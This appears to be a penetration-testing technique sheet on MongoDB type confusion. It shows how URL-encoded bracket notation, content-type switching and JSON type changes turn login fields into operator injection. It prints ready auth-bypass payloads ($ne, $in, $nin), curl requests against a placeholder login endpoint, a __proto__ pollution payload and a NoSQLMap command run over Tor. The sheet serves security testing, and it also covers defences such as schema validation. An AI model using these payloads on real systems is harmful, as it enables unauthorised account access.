# NoSQL JSON / BSON Type Confusion

## When this applies

- App expects a string in a query field but accepts whatever JSON the request body contains.
- URL-encoded form parsers that auto-coerce `[bracket]` notation into nested objects.
- Endpoints that accept multiple content-types (`application/json`, `application/x-www-form-urlencoded`) with different parser behavior.

## Technique

Replace a string parameter with a different JSON type (object, array, integer, boolean) — the resulting query takes on different semantics in MongoDB. Most commonly used with operator injection (`$ne`, `$gt`), but also for boolean/integer coercion bugs.

## Steps

### 1. URL-encoded → object coercion (Express / qs parser)

Form body:
```
username=admin&password[$ne]=
```

Parsed as:
```json
{"username": "admin", "password": {"$ne": ""}}
```

The `[bracket]` notation is parsed into a nested object — operator injection without ever sending JSON.

### 2. URL-encoded → array coercion

```
username=admin&password[$in][]=password1&password[$in][]=password2
```

Parsed as:
```json
{"username": "admin", "password": {"$in": ["password1", "password2"]}}
```

### 3. Content-type switching

If an endpoint accepts JSON, send operator objects in JSON even when the legitimate form uses URL encoding:

```bash
curl -X POST http://target/login \
  -H "Content-Type: application/json" \
  -d '{"username":"admin","password":{"$ne":""}}'

# Or vice versa
curl -X POST http://target/login \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d 'username=admin&password[$ne]='
```

If the app's input validation runs only on one content-type but the controller accepts both, switch to the unvalidated path.

### 4. Integer / Boolean type coercion

Some apps use `db.users.find({password: req.body.password})`. If `req.body.password` is the boolean `true`:

```json
{"username": "admin", "password": true}
```

MongoDB matches all documents where password is literally the boolean `true` — usually no match. But:

```json
{"username": {"$eq": "admin"}, "password": {"$ne": null}}
```

The `$ne: null` accepts any non-null password, bypassing equality.

```json
{"username": "admin", "password": 1}
```

Matches numeric `1` — useful for cases where `password` is stored as an integer (rare in practice but happens with hash-as-number bugs).

### 5. Nested operator + array exploit

```bash
# Form: password[$nin][]=wrongpass1&password[$nin][]=wrongpass2
curl -X POST http://target/login -d 'username=admin&password[$nin][]=wrongpass1&password[$nin][]=wrongpass2'
```

Parsed as `{password: {$nin: ["wrongpass1", "wrongpass2"]}}` — matches any password NOT in the list.

### 6. JavaScript prototype pollution chains

If the app accepts deeply-nested objects, `__proto__` injection can flip server-side flags:

```json
{"username": "admin", "password": "x", "__proto__": {"isAdmin": true}}
```

Not strictly NoSQL injection, but often co-located in apps that splat `req.body` into queries — worth testing.

### 7. NoSQLMap automation

```bash
nosqlmap -u "http://target/login" --tor
```

Tries multiple type-coercion patterns automatically.

## Verifying success

- Response indicates auth bypass (session cookie, "Welcome" message).
- The app behaves differently based on type — e.g. JSON `{"$ne":""}` works but string `"$ne:"` doesn't.
- Switching content-type yields different validation results (one path validates, another doesn't).

## Common pitfalls

- Modern Express middleware (`body-parser`) defaults to safe parsing; older versions of `qs` had aggressive bracket parsing that's been tightened.
- Schema validation libraries (Joi, Yup, Zod) catch type mismatches BEFORE the query runs — operator injection blocked at schema layer. Look for unvalidated routes.
- Some apps run `String(input)` — coerces objects to `"[object Object]"`, breaks operator injection.
- Mongoose with schema-defined types auto-casts: `{password: String}` casts `{$ne:""}` to `"[object Object]"` — use `db.collection.find()` directly or look for raw model usage.
- `__proto__` exploitation depends on the host language's object prototype model — works on Node.js, not on strongly-typed runtimes.

## Tools

- Burp Repeater (manual content-type / body manipulation).
- NoSQLMap (`-u <url>`, `--inject-format json|form`).
- Custom `requests.post(url, data=...)` vs `requests.post(url, json=...)` to compare parsers.
